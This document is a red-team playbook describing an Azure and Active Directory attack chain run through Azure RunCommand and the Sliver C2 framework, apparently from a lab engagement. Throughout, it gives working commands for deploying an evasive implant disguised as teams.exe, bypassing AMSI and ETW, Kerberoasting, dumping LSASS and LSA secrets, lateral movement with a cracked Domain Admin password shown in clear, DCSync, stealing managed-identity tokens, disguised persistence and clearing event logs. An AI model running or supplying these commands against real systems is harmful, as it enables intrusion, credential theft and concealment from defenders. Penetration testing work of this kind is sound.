# Azure RunCommand + Sliver C2 — Proven Attack Path

## Engagement-Proven Kill Chain

Every step was validated during a live Azure engagement. These are the exact commands that succeeded, translated to use Sliver armory BOFs, LSA Whisperer, nanorobeus, Harriet, and in-process execution.

```
ARM Token (SP or Device Code)
   |
   v
RunCommand v2 API --> SYSTEM on blueHttpServer (10.1.0.10)
                           |
                           v
                     Domain Recon: SPNs, computers, port scan
                           |
                           v
                     Kerberoast --> svc.mssql TGS --> crack password
                           |
                           v
                     LSA Secret Extraction (bootkey --> PolEKList --> AES)
                           |
                           +---> WinRM: httpserver --> blueDBServer (10.1.0.100)
                           |    (svc.mssql = Domain Admin)
                           |
                           +---> RunCommand on DC (blueDomainServer) --> SYSTEM
                           |    +-- Full AD dump (40 users, 15 computers)
                           |    +-- Managed Identity tokens
                           |    +-- Password reset + PHS sync attempt
                           |
                           +---> RunCommand on EntraConnect (blueEntraC-01) --> SYSTEM
                                +-- ADSync connector enumeration
                                +-- MI token extraction
```

### Environment

| Asset | IP / Value |
|-------|-----------|
| httpserver | blueHttpServer (10.1.0.10) |
| DBServer | blueDBServer (10.1.0.100) |
| Domain Controller | blueDC-01 / blueDomainServer (10.1.0.5) |
| EntraConnect | blueEntraC-01 (10.1.0.25) |
| FileServer | blueFileServer (10.1.0.20) |
| Domain | contoso.range |
| Tenant | MngEnvMCAP969165.onmicrosoft.com |
| Subscription | `5152d66b-be33-42c3-b579-d9f723849d41` |
| Resource Group | RGCORPSERVERS |
| Cracked Account | contoso\svc.mssql -- `GY2W*%m!P%0HK` (Domain Admin) |

### Critical: No Direct C2 Path

All VMs have NO outbound connectivity to the C2 server. Azure RunCommand is the only transport.

---

# PART 1: Azure RunCommand

## What It Is

RunCommand v2 is an Azure management plane API that executes scripts on VMs as `NT AUTHORITY\SYSTEM`. It requires an ARM token with `Virtual Machine Contributor` or `Contributor` role.

## RunCommand v2 vs v1

| Feature | v1 (`POST .../runCommand`) | v2 (`PUT .../runCommands/{name}`) |
|---------|---------------------------|-----------------------------------|
| Timeout | 90 min max | 24 hours |
| Execution | Synchronous only | Async supported |
| Multiple commands | Replaces previous | Named, coexist (max 25) |
| API version | 2023-03-01 | 2023-07-01+ |

**Always use v2.**

## Getting an ARM Token

```bash
# Option A: Service Principal
curl -X POST "https://login.microsoftonline.com/TENANT/oauth2/token" \
  -d "grant_type=client_credentials&client_id=CLIENT_ID&client_secret=SECRET&resource=https://management.azure.com"

# Option B: Via Meatball SP Auth
curl -X POST http://localhost:8080/api/auth/sp-auth \
  -H "Content-Type: application/json" \
  -d '{"tenant_id":"TENANT","client_id":"CLIENT","client_secret":"SECRET","resource":"https://management.azure.com"}'

# Option C: FOCI exchange from Graph/Office token
curl -X POST http://localhost:8080/api/tokens/foci-exchange \
  -H "Content-Type: application/json" \
  -d '{"token_id":123,"resource":"https://management.azure.com","client_id":"d3590ed6-52b3-4102-aeff-aad2292ab01c"}'
```

## Deploying a RunCommand

```bash
# Get VM location first (required)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM?api-version=2023-07-01" \
  | jq -r .location

# Deploy RunCommand v2 (async, 24hr timeout)
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM/runCommands/my-command?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "whoami /all"},
      "timeoutInSeconds": 86400,
      "asyncExecution": false
    }
  }'

# Poll for results
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM/runCommands/my-command?\$expand=instanceView&api-version=2023-07-01" \
  | jq '.properties.instanceView.output'

# Delete when done (max 25 per VM)
curl -X DELETE -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM/runCommands/my-command?api-version=2023-07-01"
```

## Quick Deploy via Helper Script

```bash
./deploy-runcommand.sh --token ARM_TOKEN --sub SUB_ID --rg RGCORPSERVERS --vm blueHttpServer --implant-url http://C2/teams.exe
```

---

# PART 2: Sliver C2 — Proven Attack Path

## OPSEC Rules

| Process | Risk |
|---------|------|
| `--in-process` | Best -- no new process |
| `RuntimeBroker.exe` | Safe -- spawns constantly |
| `dllhost.exe` | Safe -- COM surrogate |
| `WerFault.exe` | Safe -- error reporting |
| `notepad.exe` | **NEVER** -- instant EDR alert |
| `svchost.exe` | **NEVER** -- heavily monitored |

## Pre-Flight: Install Armory Extensions

```
sliver > armory install windows-credentials
sliver > armory install kerberos
sliver > armory install situational-awareness
sliver > armory install c2-tool-collection
sliver > armory install cs-remote-ops-bofs
sliver > armory install windows-pivot
sliver > armory install windows-bypass
sliver > armory install .net-recon
sliver > armory install .net-execute
sliver > armory install .net-pivot
```

---

## Phase 1: Initial Access — Harriet-Wrapped Implant via RunCommand

### Step 1: Generate + Wrap with Harriet

```bash
# On Kali — start server with auto-listeners
cd ~/sliver && ./start.sh

# Generate beacon shellcode
sliver > generate beacon --mtls YOUR_C2_IP:8888 --os windows --arch amd64 \
  --format shellcode --evasion --c2profile microsoft365 \
  --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin

# Wrap with Harriet (DirectSyscalls — most evasive)
sliver > harriet --shellcode /tmp/beacon.bin --method directsyscall \
  --format exe --output /tmp/teams.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### Step 2: Deploy via RunCommand

```bash
# Base64 encode and deploy via RunCommand
B64=$(base64 -w0 /tmp/teams.exe)

SCRIPT="[IO.File]::WriteAllBytes('C:\ProgramData\Microsoft\Network\teams.exe',[Convert]::FromBase64String('$B64')); Start-Process 'C:\ProgramData\Microsoft\Network\teams.exe'"

curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/RGCORPSERVERS/providers/Microsoft.Compute/virtualMachines/blueHttpServer/runCommands/deploy-sliver?api-version=2023-07-01" \
  -d "{\"location\":\"eastus2\",\"properties\":{\"source\":{\"script\":\"$SCRIPT\"},\"timeoutInSeconds\":86400,\"asyncExecution\":true}}"
```

### Step 3: Verify Beacon

```
sliver > beacons
sliver > use <BEACON_ID>
sliver > interactive                   # Upgrade to session for faster ops
```

---

## Phase 2: Domain Recon (BOFs — No Process Spawn)

### Step 4: Situational Awareness

```
# Evasion first
sliver (IMPLANT) > inject-amsi-bypass
sliver (IMPLANT) > inject-etw-bypass

# Identity + privileges
sliver (IMPLANT) > sa-whoami
sliver (IMPLANT) > getprivs

# Network
sliver (IMPLANT) > sa-ipconfig
sliver (IMPLANT) > sa-arp
sliver (IMPLANT) > sa-netstat

# AV/EDR detection
sliver (IMPLANT) > sa-driversigs
sliver (IMPLANT) > sa-enum-filter-driver
```

### Step 5: Enumerate Domain

```
# Domain info
sliver (IMPLANT) > c2tc-domaininfo

# All computers with OS
sliver (IMPLANT) > sa-ldapsearch "(objectClass=computer)" cn,dNSHostName,operatingSystem

# Domain Admins
sliver (IMPLANT) > sa-netgroup "Domain Admins" /domain

# Local admins on this box
sliver (IMPLANT) > sa-netlocalgroup Administrators

# Password policy
sliver (IMPLANT) > sa-get-password-policy
```

### Step 6: Port Scan Internal Network

```
sliver (IMPLANT) > portscan --host 10.1.0.100 --ports 445,5985,3389,1433,135,88,389
sliver (IMPLANT) > portscan --host 10.1.0.5 --ports 445,5985,3389,88,389,636
sliver (IMPLANT) > portscan --host 10.1.0.25 --ports 445,5985,3389
sliver (IMPLANT) > portscan --host 10.1.0.20 --ports 445,5985,3389
```

**Result**: Port 5985 (WinRM) open on blueDBServer from httpserver.

### Step 7: Find Kerberoastable SPNs

```
# Via BOF (in-process, no .NET)
sliver (IMPLANT) > sa-ldapsearch "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName

# Or nanorobeus (BOF Rubeus — kerberoast directly)
sliver (IMPLANT) > nanorobeus kerberoast
```

**Result**: Found `svc.mssql` with SPN `MSSQLSvc/blueDBServer.contoso.range:1433`.

---

## Phase 3: Credential Harvesting

### Tier 1: LSA Whisperer (Best — No LSASS Touch, Credential Guard Bypass)

[LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer) by SpecterOps uses `LsaCallAuthenticationPackage` — talks to LSA auth packages via LSASS's public API. Never opens an LSASS handle. Works even with Credential Guard.

```
# DPAPI credential keys (bypasses Credential Guard!)
sliver (IMPLANT) > execute-assembly --in-process /opt/tools/lsa-whisperer.exe --msv credkey

# NTLMv1 response for rainbow table cracking
sliver (IMPLANT) > execute-assembly --in-process /opt/tools/lsa-whisperer.exe --msv ntlmv1

# Kerberos tickets with session keys
sliver (IMPLANT) > execute-assembly --in-process /opt/tools/lsa-whisperer.exe --kerberos klist
sliver (IMPLANT) > execute-assembly --in-process /opt/tools/lsa-whisperer.exe --kerberos dump

# Azure AD / Entra ID — cloud SSO token theft
sliver (IMPLANT) > execute-assembly --in-process /opt/tools/lsa-whisperer.exe --cloudap ssocookie
sliver (IMPLANT) > execute-assembly --in-process /opt/tools/lsa-whisperer.exe --cloudap info
```

### Tier 2: Kerberoast + Offline Crack

```
# nanorobeus (BOF — fastest, no .NET)
sliver (IMPLANT) > nanorobeus kerberoast

# rubeus (.NET — more options)
sliver (IMPLANT) > rubeus -- kerberoast /format:hashcat /nowrap

# bof-roast (BOF alternative)
sliver (IMPLANT) > bof-roast MSSQLSvc/blueDBServer.contoso.range:1433

# On Kali — crack the hash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Result**: Cracked `svc.mssql` password: `GY2W*%m!P%0HK`

### Tier 3: LSA Secret Extraction (Registry — No LSASS Touch)

Extracts cleartext service account passwords from registry. Requires SYSTEM.

```
# List LSA secrets
sliver (IMPLANT) > execute -o powershell -c "Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty PSChildName"
# Found: _SC_MSSQL$SQLEXPRESS

# Extract via sharpsecdump (in-memory, no files)
sliver (IMPLANT) > sharpsecdump -- -target=localhost

# Or mimikatz (reflectively loaded)
sliver (IMPLANT) > mimikatz lsadump::secrets
```

**Result**: Decrypted `GY2W*%m!P%0HK` for `contoso\svc.mssql` (Domain Admin).

### Tier 4: LSASS Dump (Last Resort)

```
# nanodump (BOF — syscall-based, most evasive LSASS dump)
sliver (IMPLANT) > nanodump -- --write C:\Windows\Temp\debug.dmp --valid

# handlekatz (handle duplication — avoids direct LSASS open)
sliver (IMPLANT) > handlekatz

# procdump (built-in Sliver)
sliver (IMPLANT) > procdump -n lsass.exe -s /tmp/lsass.dmp

# On Kali: pypykatz lsa minidump lsass.dmp
```

### Credential Priority

| Priority | Tool | Method | EDR Risk | Cred Guard |
|----------|------|--------|----------|-----------|
| 1 | **LSA Whisperer** | LsaCallAuthenticationPackage | Minimal | **Works** |
| 2 | **Kerberoast** | TGS request + offline crack | None | N/A |
| 3 | **LSA Secrets** | Registry + offline decrypt | None | N/A |
| 4 | **nanodump** | Syscall LSASS dump | Low | Blocked |
| 5 | **handlekatz** | Handle duplication | Low | Blocked |
| 99 | ~~mimikatz~~ | ~~Direct LSASS read~~ | **INSTANT ALERT** | Blocked |

---

## Phase 4: Lateral Movement — httpserver --> DBServer

### Step 8: Test WinRM Access

```
sliver (IMPLANT) > execute -o powershell -c "Test-WSMan -ComputerName blueDBServer -ErrorAction SilentlyContinue"
```

### Step 9: Execute on DBServer via Armory BOFs

```
# jump-wmiexec (BOF — WMI lateral movement)
sliver (IMPLANT) > jump-wmiexec blueDBServer 'whoami /all'

# winrm (BOF)
sliver (IMPLANT) > winrm

# sharp-wmi (.NET — more control)
sliver (IMPLANT) > sharp-wmi -- action=exec computername=blueDBServer \
  command="whoami /all" username=contoso\svc.mssql password="GY2W*%m!P%0HK"

# remote-* BOFs for targeted ops
sliver (IMPLANT) > remote-sc-create blueDBServer updatesvc "C:\Windows\Temp\svc.exe"
sliver (IMPLANT) > remote-sc-start blueDBServer updatesvc
```

**Result**: `contoso\svc.mssql` confirmed Domain Admin on DBServer.

### Step 10: Deploy Pivot Implant on DBServer

```
# Generate TCP pivot implant (routes through httpserver)
sliver > generate --tcp-pivot 10.1.0.10:8888 --os windows --arch amd64 \
  --skip-symbols --name db-pivot --save /tmp/db-pivot.exe

# Start TCP pivot listener on httpserver session
sliver (IMPLANT) > pivots tcp --bind 0.0.0.0:8888

# Upload + execute via WinRM
sliver (IMPLANT) > execute -o powershell -c "
$cred = New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'GY2W*%m!P%0HK' -AsPlainText -Force))
$bytes = [IO.File]::ReadAllBytes('C:\Windows\Temp\db-pivot.exe')
Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock {
    param($b) [IO.File]::WriteAllBytes('C:\Windows\Temp\svc-update.exe',$b); Start-Process 'C:\Windows\Temp\svc-update.exe'
} -ArgumentList (,$bytes)
"

# Or use jump-psexec BOF
sliver (IMPLANT) > jump-psexec blueDBServer updatesvc /tmp/db-pivot.exe C:\Windows\Temp\svc-update.exe
```

### Step 11: Verify Pivot

```
sliver > sessions                      # New session from DBServer via TCP pivot
sliver > use <DB_SESSION>
sliver (DB_SESSION) > sa-whoami        # Should be svc.mssql on BLUEDBSERVER
```

**Result**: Two sessions -- httpserver (direct) + DBServer (TCP pivot through httpserver).

---

## Phase 5: Post-Exploitation on DBServer

```
# SQL Server access
sliver (DB_SESSION) > execute -o sqlcmd -S localhost -Q "SELECT name FROM sys.databases"
sliver (DB_SESSION) > execute -o sqlcmd -S localhost -Q "SELECT * FROM sys.sql_logins"
sliver (DB_SESSION) > execute -o sqlcmd -S localhost -Q "SELECT name,data_source FROM sys.servers WHERE is_linked=1"

# Or use sqlrecon (.NET — full SQL post-exploitation)
sliver (DB_SESSION) > sqlrecon -- /host:localhost /auth:wintoken /enum:databases
sliver (DB_SESSION) > sqlrecon -- /host:localhost /auth:wintoken /enum:links

# Credential dump on DBServer
sliver (DB_SESSION) > mimikatz sekurlsa::logonpasswords
sliver (DB_SESSION) > sharpsecdump -- -target=localhost

# Network recon from DBServer
sliver (DB_SESSION) > portscan --host 10.1.0.5 --ports 445,5985,3389,88,389
sliver (DB_SESSION) > portscan --host 10.1.0.20 --ports 445,5985,3389
```

---

## Phase 6: DC Takeover via RunCommand

Since we have an ARM token with Contributor, use RunCommand directly on the DC:

### Step 12: Full AD Dump from DC

```bash
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/RGCORPSERVERS/providers/Microsoft.Compute/virtualMachines/blueDomainServer/runCommands/dc-recon?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "Import-Module ActiveDirectory\nGet-ADUser -Filter * -Properties MemberOf | Select Name,SamAccountName,Enabled | Format-Table\nGet-ADGroupMember \"Domain Admins\" | Select SamAccountName\nGet-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address"},
      "timeoutInSeconds": 120
    }
  }'
```

### Step 13: DCSync via Sliver (if pivot to DC)

```
# If you have a session on the DC:
sliver (DC_SESSION) > mimikatz lsadump::dcsync /user:contoso\krbtgt
sliver (DC_SESSION) > mimikatz lsadump::dcsync /user:contoso\Administrator

# Or via nanorobeus from any DA session:
sliver (IMPLANT) > nanorobeus dump /all
```

### Step 14: Managed Identity Token Extraction

```bash
# Via RunCommand on any Azure VM
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/RGCORPSERVERS/providers/Microsoft.Compute/virtualMachines/blueDomainServer/runCommands/mi-token?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "$r=Invoke-WebRequest -Uri \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com\" -Headers @{Metadata=\"true\"} -UseBasicParsing; $r.Content"},
      "timeoutInSeconds": 30
    }
  }'
```

### Step 15: EntraConnect ADSync Extraction

```bash
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/RGCORPSERVERS/providers/Microsoft.Compute/virtualMachines/blueEntraC-01/runCommands/adsync-enum?api-version=2023-07-01" \
  -d '{
    "location": "eastus2",
    "properties": {
      "source": {"script": "Get-ADSyncConnector | Select Name,Type,ConnectorTypeName | Format-Table\nGet-ADSyncScheduler | Format-List\nGet-ADSyncGlobalSettings | Select -ExpandProperty Parameters | Format-Table"},
      "timeoutInSeconds": 60
    }
  }'
```

---

## Phase 7: Persistence

### On Target VMs (via Sliver session)

```
# sharpersist (.NET — multiple persistence methods)
sliver (IMPLANT) > sharpersist -- -t schtask -c "C:\ProgramData\Microsoft\Network\teams.exe" -n "DiagCheck" -m add -o logon
sliver (IMPLANT) > sharpersist -- -t reg -c "C:\ProgramData\Microsoft\Network\teams.exe" -k "hklmrun" -v "DiagTrack" -m add
sliver (IMPLANT) > sharpersist -- -t service -c "C:\ProgramData\Microsoft\Network\teams.exe" -n "DiagSvc" -m add

# Remote persistence via BOF
sliver (IMPLANT) > remote-schtaskscreate blueDBServer DiagCheck "C:\Windows\Temp\svc-update.exe"
sliver (IMPLANT) > remote-sc-create blueDBServer DiagSvc "C:\Windows\Temp\svc-update.exe"
```

### Via RunCommand (persistent agent on any Azure VM)

```bash
SCRIPT='$p="C:\ProgramData\Microsoft\Network\svchost.exe"
$a=New-ScheduledTaskAction -Execute $p
$t=New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Microsoft\Windows\NetTrace\DiagCheck" -Action $a -Trigger $t -User "SYSTEM" -RunLevel Highest -Force
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "DiagTrack" -Value $p -Force'

curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/RGCORPSERVERS/providers/Microsoft.Compute/virtualMachines/$VM/runCommands/persist?api-version=2023-07-01" \
  -d "{\"location\":\"eastus2\",\"properties\":{\"source\":{\"script\":\"$SCRIPT\"},\"timeoutInSeconds\":60}}"
```

---

## Phase 8: Cleanup

```
# Remove persistence
sliver (IMPLANT) > execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
sliver (IMPLANT) > execute -o reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /f
sliver (IMPLANT) > execute -o sc delete DiagSvc

# Remove implant files
sliver (IMPLANT) > rm C:\ProgramData\Microsoft\Network\teams.exe
sliver (IMPLANT) > rm C:\ProgramData\Microsoft\Network\svchost.exe
sliver (IMPLANT) > rm C:\Windows\Temp\svc-update.exe
sliver (IMPLANT) > rm C:\Windows\Temp\*.dmp

# Clear logs
sliver (IMPLANT) > execute -o "wevtutil cl Security"
sliver (IMPLANT) > execute -o "wevtutil cl System"
sliver (IMPLANT) > execute -o "wevtutil cl Microsoft-Windows-PowerShell/Operational"

# Delete RunCommands from Azure
for CMD in deploy-sliver dc-recon mi-token adsync-enum persist; do
  curl -X DELETE -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/RGCORPSERVERS/providers/Microsoft.Compute/virtualMachines/$VM/runCommands/$CMD?api-version=2023-07-01"
done

# Revert token + kill beacon
sliver (IMPLANT) > rev2self
sliver (IMPLANT) > exit
```

---

## Tool Reference

| Tool | Type | Install | Purpose |
|------|------|---------|---------|
| **LSA Whisperer** | Standalone exe | `/opt/tools/lsa-whisperer` | Credential Guard bypass, DPAPI keys, SSO cookies |
| **nanorobeus** | BOF (armory) | `armory install kerberos` | Kerberos tickets, kerberoast, pass-the-ticket |
| **nanodump** | BOF (armory) | `armory install windows-credentials` | LSASS dump via syscalls |
| **mimikatz** | BOF (armory) | `armory install windows-credentials` | Full credential suite (use sparingly) |
| **handlekatz** | BOF (armory) | `armory install windows-credentials` | LSASS via handle duplication |
| **credman** | BOF (armory) | `armory install windows-credentials` | Windows Credential Manager |
| **sharpsecdump** | .NET (armory) | `armory install .net-pivot` | Remote SAM/LSA dump |
| **sharpdpapi** | .NET (armory) | `armory install .net-pivot` | DPAPI master key recovery |
| **rubeus** | .NET (armory) | `armory install .net-pivot` | Full Kerberos toolkit |
| **bof-roast** | BOF (armory) | `armory install kerberos` | Kerberoast via BOF |
| **jump-psexec** | BOF (armory) | `armory install windows-pivot` | PsExec lateral movement |
| **jump-wmiexec** | BOF (armory) | `armory install windows-pivot` | WMI lateral movement |
| **sharp-wmi** | .NET (armory) | `armory install .net-execute` | WMI execution |
| **sharpmapexec** | .NET (armory) | `armory install .net-execute` | Multi-protocol lateral movement |
| **sharpersist** | .NET (armory) | `armory install .net-execute` | Persistence mechanisms |
| **certify** | .NET (armory) | `armory install .net-pivot` | AD CS attacks |
| **sqlrecon** | .NET (armory) | `armory install .net-pivot` | SQL Server post-exploitation |
| **seatbelt** | .NET (armory) | `armory install .net-recon` | Security audit |
| **sharp-hound-4** | .NET (armory) | `armory install .net-recon` | BloodHound AD collection |
| **Harriet** | C++ loader | `setup.sh` | AES-encrypted shellcode wrapper (AV bypass) |
